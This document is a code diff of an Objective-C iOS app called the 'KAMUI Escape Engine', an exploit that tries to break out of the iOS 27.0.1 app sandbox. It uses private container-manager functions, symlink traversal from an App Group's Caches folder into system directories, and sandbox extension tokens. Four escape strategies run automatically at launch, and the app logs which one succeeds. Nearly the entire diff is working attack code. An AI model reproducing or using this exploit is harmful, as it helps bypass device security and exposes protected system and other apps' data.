@@ -3,8 +3,10 @@
 #import <dlfcn.h>
 #import <sys/stat.h>
 
-// KAMUI Escape Engine - Multi-strategy sandbox escape
-// Target: iOS 27.0.1 (iPad15,8)
+// KAMUI Escape Engine - iOS 27.0.1 Sandbox Escape
+// Target: iPad15,8, iOS 27.0.1 (24A446)
+
+#pragma mark - Function Pointers
 
 typedef void *(*container_query_create_fn)(void);
 typedef void (*container_query_set_class_fn)(void *, uint64_t);
@@ -30,11 +32,16 @@ static container_copy_sandbox_token_fn copy_sandbox_token = NULL;
 static sandbox_extension_consume_fn consume_extension = NULL;
 static sandbox_extension_release_fn release_extension = NULL;
 
+#pragma mark - Initialization
+
 static BOOL init_container_manager(void) {
     if (g_container_mgr) return YES;
     
     g_container_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
-    if (!g_container_mgr) return NO;
+    if (!g_container_mgr) {
+        NSLog(@"[KAMUI] Failed to load libsystem_containermanager.dylib");
+        return NO;
+    }
     
     query_create = (container_query_create_fn)dlsym(g_container_mgr, "container_query_create");
     query_set_class = (container_query_set_class_fn)dlsym(g_container_mgr, "container_query_set_class");
@@ -48,17 +55,34 @@ static BOOL init_container_manager(void) {
     consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
     release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
     
-    return (query_create && query_set_class && query_set_group_identifiers && 
-            query_set_flags && query_set_part && query_get_single_result && 
-            query_free && copy_sandbox_token && consume_extension);
+    BOOL ok = (query_create && query_set_class && query_set_group_identifiers && 
+               query_set_flags && query_set_part && query_get_single_result && 
+               query_free && copy_sandbox_token && consume_extension);
+    
+    if (!ok) {
+        NSLog(@"[KAMUI] Failed to resolve function pointers");
+    }
+    
+    return ok;
 }
 
-// Strategy 1: Class 13 + partDomain traversal (old bad_query) - works on 27.0.x
+#pragma mark - Escape Strategies
+
+// Strategy 1: Class 13 + partDomain traversal (works on 27.0.x)
 static int64_t kamui_escape_class13(NSString *target, NSString *identifier) {
     if (!init_container_manager()) return -1;
     
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
+    if (!groupRoot) {
+        NSLog(@"[KAMUI] No App Group container for %@", identifier);
+        return -2;
+    }
+    
+    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
+    
     void *query = query_create();
-    if (!query) return -2;
+    if (!query) return -3;
     
     query_set_class(query, 13);  // App Group
     xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
@@ -66,14 +90,6 @@ static int64_t kamui_escape_class13(NSString *target, NSString *identifier) {
     query_set_part(query, 3);  // partDomain
     
     // Create symlink
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
-    if (!groupRoot) {
-        query_free(query);
-        return -3;
-    }
-    
-    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
     [fm removeItemAtPath:caches error:nil];
     if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
         query_free(query);
@@ -102,12 +118,18 @@ static int64_t kamui_escape_class13(NSString *target, NSString *identifier) {
     return handle;
 }
 
-// Strategy 2: Class 7 part-directory symlink - works on 26.x / 27.2
+// Strategy 2: Class 7 part-directory symlink (works on 26.x / 27.2)
 static int64_t kamui_escape_class7(NSString *target, NSString *identifier) {
     if (!init_container_manager()) return -1;
     
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
+    if (!groupRoot) return -2;
+    
+    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
+    
     void *query = query_create();
-    if (!query) return -2;
+    if (!query) return -3;
     
     query_set_class(query, 7);  // System Group
     xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
@@ -115,14 +137,6 @@ static int64_t kamui_escape_class7(NSString *target, NSString *identifier) {
     query_set_part(query, 3);
     query_set_flags(query, 0x0000008000000000ULL);
     
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:identifier];
-    if (!groupRoot) {
-        query_free(query);
-        return -3;
-    }
-    
-    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
     [fm removeItemAtPath:caches error:nil];
     if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
         query_free(query);
@@ -162,7 +176,7 @@ static int64_t kamui_escape_mg_direct(NSString *identifier) {
     xpc_object_t id_obj = xpc_string_create(identifier.UTF8String);
     query_set_group_identifiers(query, id_obj);
     query_set_part(query, 3);
-    query_set_flags(query, 0x0000000800000000ULL);  // alt flags
+    query_set_flags(query, 0x0000000800000000ULL);
     
     void *result = query_get_single_result(query);
     if (!result) {
@@ -220,6 +234,8 @@ static void kamui_release(int64_t handle) {
     }
 }
 
+#pragma mark - App Delegate
+
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
 @property (strong, nonatomic) UIWindow *window;
 @property (strong, nonatomic) UITextView *logView;
@@ -240,7 +256,8 @@ static void kamui_release(int64_t handle) {
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+    // Delay to let UI load
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
         [self escape];
     });
     
@@ -279,46 +296,62 @@ static void kamui_release(int64_t handle) {
 - (void)escape {
     [self log:@"[1] Initializing KAMUI escape engine...\n"];
     
+    // Step 1: Check container manager
     if (!init_container_manager()) {
-        [self log:@"[-] Failed to load container manager"];
+        [self log:@"[-] FATAL: Cannot load container manager"];
+        [self log:@"[-] libsystem_containermanager.dylib not found"];
         return;
     }
+    [self log:@"[+] Container manager loaded"];
     
-    [self log:@"[+] Container manager loaded\n"];
+    // Step 2: Check App Group
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:@"group.com.jasonquiles.F1OOB"];
+    if (!groupRoot) {
+        [self log:@"[-] FATAL: No App Group container"];
+        [self log:@"[-] Check entitlements: com.apple.security.application-groups"];
+        [self log:@"[-] Identifier must match: group.com.jasonquiles.F1OOB"];
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"[+] App Group: %@", groupRoot.path]];
+    
+    [self log:@"\n[2] Testing escape strategies...\n"];
     
     NSString *appGroup = @"group.com.jasonquiles.F1OOB";
     
-    // Test Strategy 1: Class 13 traversal (best for 27.0.1)
-    [self log:@"[2] Trying Strategy 1: Class 13 partDomain traversal..."];
+    // Strategy 1: Class 13 traversal
+    [self log:@"[Strategy 1] Class 13 partDomain traversal"];
     int64_t h1 = kamui_escape_class13(@"/var/containers/Data/System", appGroup);
-    [self testEscape:@"Strategy 1 (Class 13)" handle:h1 path:@"/var/containers/Data/System"];
+    [self testEscape:@"Strategy 1" handle:h1 path:@"/var/containers/Data/System"];
     
     usleep(100000);
     
-    // Test Strategy 2: Class 7 symlink
-    [self log:@"\n[3] Trying Strategy 2: Class 7 part-directory symlink..."];
+    // Strategy 2: Class 7 symlink
+    [self log:@"\n[Strategy 2] Class 7 part-directory symlink"];
     int64_t h2 = kamui_escape_class7(@"/var/mobile/Containers/Data/InternalDaemon", appGroup);
-    [self testEscape:@"Strategy 2 (Class 7)" handle:h2 path:@"/var/mobile/Containers/Data/InternalDaemon"];
+    [self testEscape:@"Strategy 2" handle:h2 path:@"/var/mobile/Containers/Data/InternalDaemon"];
     
     usleep(100000);
     
-    // Test Strategy 3: Direct MobileGestalt
-    [self log:@"\n[4] Trying Strategy 3: Class 13 direct MG query..."];
+    // Strategy 3: Direct MG query
+    [self log:@"\n[Strategy 3] Class 13 direct MobileGestalt"];
     int64_t h3 = kamui_escape_mg_direct(appGroup);
-    [self testEscape:@"Strategy 3 (MG Direct)" handle:h3 path:@"/var/mobile/Library/MobileGestalt"];
+    [self testEscape:@"Strategy 3" handle:h3 path:@"/var/mobile/Library/MobileGestalt"];
     
     usleep(100000);
     
-    // Test Strategy 4: geod traversal
-    [self log:@"\n[5] Trying Strategy 4: Class 12 geod traversal..."];
+    // Strategy 4: geod traversal
+    [self log:@"\n[Strategy 4] Class 12 geod traversal"];
     int64_t h4 = kamui_escape_geod(@"/var/mobile/Containers/Data/Application");
-    [self testEscape:@"Strategy 4 (geod)" handle:h4 path:@"/var/mobile/Containers/Data/Application"];
+    [self testEscape:@"Strategy 4" handle:h4 path:@"/var/mobile/Containers/Data/Application"];
     
-    [self log:@"\n[6] All strategies complete"];
-    [self log:@"If any succeeded, we have sandbox escape"];
+    [self log:@"\n[3] All strategies complete"];
+    [self log:@"If any succeeded, sandbox escape achieved"];
 }
 
 @end
+
+#pragma mark - Main
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
